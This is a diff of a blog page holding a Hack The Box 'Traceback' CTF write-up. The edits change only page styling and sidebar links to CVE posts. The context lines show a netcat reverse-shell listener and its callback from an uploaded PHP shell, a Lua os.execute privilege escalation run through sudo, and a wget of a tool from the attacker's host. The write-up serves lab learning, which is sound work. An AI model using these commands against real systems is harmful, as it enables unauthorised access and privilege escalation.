@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/hack-the-box-traceback-writeup\/"
@@ -511,7 +515,7 @@
 <h1 id="information-gathering">Information Gathering</h1>
 <h2 id="port-scan-nmap">Port Scan: Nmap</h2>
 <p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# nmap -sVC 10.10.10.181
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# nmap -sVC 10.10.10.181
 </span></span><span style="display:flex;"><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 18:54 EDT
 </span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.181
 </span></span><span style="display:flex;"><span>Host is up (0.084s latency).
@@ -535,7 +539,7 @@
 <p><img src="/posts/images/hack-the-box-traceback-writeup/port80.png" alt="port80"><br>
 <strong>Figure 1:</strong> This site has been owned by Xh4H.</p>
 <p>Looking at the source code of the defaced page we find an HTML comment that indicates this backdoor is a webshell of some sort.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
 </span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">center</span>&gt;
 </span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">h1</span>&gt;This site has been owned&lt;/<span style="color:#f92672">h1</span>&gt;
 </span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">h2</span>&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/<span style="color:#f92672">h2</span>&gt;
@@ -575,7 +579,7 @@
 <p>To create our Lua script and launch it for a privilege escalation to <code>sysadmin</code> we&rsquo;re going to need a reverse shell on the machine. To do this we&rsquo;ll launch a netcat listener via <code>nc -lvp 4444</code> and upload a php revers shell named <code>x.php</code>. Navigating to <code>http:10.10.10.181/x.php</code> with trigger the reverse shell to call back to us.</p>
 <p><img src="/posts/images/hack-the-box-traceback-writeup/shell_upload.png" alt="shell_upload"><br>
 <strong>Figure 9:</strong> Uploading <code>x.php</code>, our reverse shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# nc -lvp 4444
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# nc -lvp 4444
 </span></span><span style="display:flex;"><span>listening on [any] 4444 ...
 </span></span><span style="display:flex;"><span>connect to [10.10.15.38] from traceback.htb [10.10.10.181] 47416
 </span></span><span style="display:flex;"><span>Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
@@ -585,7 +589,7 @@
 </span></span><span style="display:flex;"><span>/bin/sh: 0: can&#39;t access tty; job control turned off
 </span></span><span style="display:flex;"><span>$   
 </span></span></code></pre></div><p>Once we&rsquo;ve got the reverse shell going we&rsquo;ll create the Lua file next and execute it for privilege escalation to <code>sysadmin</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;os.execute(&#39;/bin/bash&#39;)&#34;</span> &gt; privesc.lua
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;os.execute(&#39;/bin/bash&#39;)&#34;</span> &gt; privesc.lua
 </span></span><span style="display:flex;"><span>$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
 </span></span><span style="display:flex;"><span>sh: turning off NDELAY mode
 </span></span><span style="display:flex;"><span>whoami
@@ -601,7 +605,7 @@
 <img src="/posts/images/hack-the-box-traceback-writeup/ssh_in_user.png" alt="ssh_in_user"><br>
 <strong>Figure 10:</strong> ssh&rsquo;ing back in as <code>sysadmin</code> and launching bash.</p>
 <p>To monitor the running processes we&rsquo;ll download <a href="https://github.com/DominicBreuker/pspy" target="_blank">pspy</a> from our Kali box&rsquo;s Apache server into the <code>/tmp</code> directory of the machine.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Console" data-lang="Console"><span style="display:flex;"><span>sysadmin@traceback:~$ cd /tmp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Console" data-lang="Console"><span style="display:flex;"><span>sysadmin@traceback:~$ cd /tmp
 </span></span><span style="display:flex;"><span>sysadmin@traceback:/tmp$ wget http://10.10.15.38/pspy64
 </span></span><span style="display:flex;"><span>--2020-04-10 12:40:27--  http://10.10.15.38/pspy64
 </span></span><span style="display:flex;"><span>Connecting to 10.10.15.38:80... connected.
